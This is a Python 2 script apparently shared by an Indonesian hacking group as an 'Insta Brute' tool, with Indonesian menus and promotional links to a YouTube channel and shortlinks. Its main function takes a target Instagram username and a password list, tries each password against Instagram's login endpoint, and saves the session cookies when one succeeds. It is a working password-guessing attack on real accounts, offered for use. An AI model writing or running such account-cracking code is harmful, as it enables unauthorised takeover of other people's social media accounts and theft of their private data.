#!/usr/bin/python2
# Ciieee Yang Berhasil Decrypt Pasti Pro Nih :v
# Author : ./FUKUR0-3XP
# Team : Black Coders Anonymous Satanic Exploiter Team ( BCA - X666X )
# Recode Tidak Akan Membuat Anda Menjadi Pencipta Kode :3

from requests.exceptions import ConnectionError 
from cookielib import LWPCookieJar as Cookie
from bs4 import BeautifulSoup
import requests, random, time, sys, os, re

M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'

def MesinTik(s):
	for x in s + '\n':
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(random.random() * 0.01)
		
def Banner():
	os.system('clear')
	MesinTik(''+C+'''
  ___           _          ____             _       
 |_ _|_ __  ___| |_ __ _  | __ ) _ __ _   _| |_ ___ 
  | || '_ \/ __| __/ _` | |  _ \| '__| | | | __/ _ \\
  | || | | \__ \ || (_| | | |_) | |  | |_| | ||  __/
 |___|_| |_|___/\__\__,_| |____/|_|   \__,_|\__\___|
                '''+W+'Creator : ./Fukur0\n\t\t   YT : Jejak Cyber')
                
def Tool():
	os.system('clear')
	Banner()
	print
	print
	try:
	
		Username = raw_input(W+'Username Target : '+C+'')
		List_Pass = raw_input(W+'List Password : '+C+'')
		print
		MesinTik(''+C+'-------------- '+W+'Starting'+C+' --------------')
		print
	
		Open_List = open(List_Pass).readlines()
	
		for Pass in Open_List:
		
			Password = str(Pass.strip().split('\n')[0])
		
			Search_User = 'https://instagram.com/' + Username
			Get_User = requests.get(Search_User)
		
			if 'alternateName' in Get_User.text:
				pass
		
			else:
				print(M+'User Tidak Di Temukan !')
				sys.exit()
			
			Url = 'https://www.instagram.com'
			UrlLogin = Url + '/accounts/login/ajax/'
		
			GetUrl = requests.get(Url)
			Soup = BeautifulSoup(GetUrl.text, 'html.parser')
			Csrf = Soup.find_all('script', {'type' : 'text/javascript'})[3].text[46:78]
		
			headers = {
			'X-CSRFToken' : '{Csrf}',
			'Referer' : 'https://www.instagram.com/accounts/login/'
			}
		
			data = {
			'username' : Username,
			'password' : Password
			}
		
			Cookies = Cookie('.cookieslog')
		
			Sess = requests.Session()
			Sess.cookies = Cookies
			Sess.headers = headers
		
			Log = Sess.post(UrlLogin, data = data, allow_redirects = True)
			Sess.headers.update({'X-CSRFToken' : '{Csrf}'})
		
			In = Sess.get(Url, allow_redirects=True)
			if 'biography' in In.text:
				print(W+'[   '+H+'Found'+W+'   ]'+C+' Username : '+W+Username+C+' Password : '+W+Password)
				Sess.cookies.save()
				sys.exit()
			
			else:
				print(W+'[ '+A+'Not Found'+W+' ]'+C+' Username : '+W+Username+C+' Password : '+W+Password)

	except ConnectionError:
		print(M+'Cek Jaringan Bro !')
		sys.exit()
	
	except IOError:
		print(M+'File List Password Tidak Di Termukan !')
		sys.exit()
	
def Log_In():
	os.system('clear')
	print(W+'\t ['+H+'\xE2\x9C\x9A'+W+'] LOG IN TOOL'+W+'['+H+'\xE2\x9C\x9A'+W+']')
	MesinTik(W+20 * '\xE2\x95\x90\xE2\x95\x90')
	print
	MesinTik(C+'Log In Dulu Sebelum Masuk Toolnya\nKalo Belum Punya Username & Password\nSilahkan Download Dulu : '+W+'https://bit.ly/2Vje6B0'+C+'\nCara Download : '+W+'https://bit.ly/2Vj7sKQ')
	print
	MesinTik(W+20 * '\xE2\x95\x90\xE2\x95\x90')
	username = 'SUBSCRIBE'
	password = 'JEJAK CYBER'

	print
	usr = raw_input(W+'USERNAME : '+C+'')

	if usr.upper() == username:
		pass
		
	elif not usr.upper() == username:
		print
		print(M+'Username Salah \xE2\x9C\x96')
		sys.exit()
	
	pwd = raw_input(W+'PASSWORD : '+C+'')

	if pwd.upper() == password:
		print
		print(W+'Log In Berhasil'+H+' \xE2\x9C\x94')
		time.sleep(2)
		Tool()
	
	elif not pwd.upper() == password:
		print
		print(M+'Password Salah \xE2\x9C\x96')
		sys.exit()
		
def Milih():
	os.system('clear')
	print(W+'   ['+H+'\xE2\x9C\x9A'+W+'] SELAMAT DATANG DI TOOL KAMI'+W+'['+H+'\xE2\x9C\x9A'+W+']')
	MesinTik(W+20 * '\xE2\x95\x90\xE2\x95\x90')
	print
	print(W+'['+H+'1'+W+']'+C+' Log In Tools')
	print(W+'['+H+'2'+W+']'+C+' Download Data Log In')
	print(W+'['+H+'3'+W+']'+C+' Tutorial Download Data Log In')
	print(W+'['+H+'4'+W+']'+C+' Subscribe Channel Admin')
	print(W+'['+H+'5'+W+']'+C+' Laporkan Bug')
	print
	MesinTik(W+20 * '\xE2\x95\x90\xE2\x95\x90')
	print
	Choose = input(W+'Pilih -> '+C+'')

	if Choose == 1:
		Log_In()

	elif Choose == 2:
		print
		MesinTik(C+'Membuka Link Download'+W+' ...')
		time.sleep(1.5)
		os.system('xdg-open https://safeku.com/2yAoW')
		Milih()

	elif Choose == 3:
		print
		MesinTik(C+'Membuka Link Tutorial Download Data Log In'+W+' ...')
		time.sleep(1.5)
		os.system('xdg-open https://skuylearn.blogspot.com/2020/02/Cara-Melewati-Shortlink-Blogger.html?m=1')
		Milih() 

	elif Choose == 4:
		print
		MesinTik(C+'Membuka Link Channel YouTube Admin'+W+' ...')
		time.sleep(1.5)
		os.system('xdg-open https://www.youtube.com/channel/UCzsADl8XRJeZXJ6CKZLX5KQ')
		Milih()
	
	elif Choose == 5:
		print
		MesinTik(C+'Membuka WhatsApp'+W+' ...')
		time.sleep(1.5)
		os.system('xdg-open http://wa.me/6285880818385')
		Milih()

if __name__ == '__main__':
	Milih()
